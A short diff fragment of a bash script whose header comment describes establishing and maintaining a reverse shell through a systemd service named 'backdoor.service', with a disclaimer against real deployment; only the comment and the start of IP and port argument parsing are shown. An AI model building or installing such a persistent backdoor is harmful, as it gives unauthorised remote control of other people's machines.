@@ -1,6 +1,7 @@
 #!/bin/bash
 
-# script to establish and maintain a reverse shell connection
+# script to establish and maintain a reverse shell connection via a systemd service dubbed "backdoor.service".
+# obviously not for use in actual deployments
 
 # retrieve IP address and port from command line options
 while getopts ":I:P:" opt; do
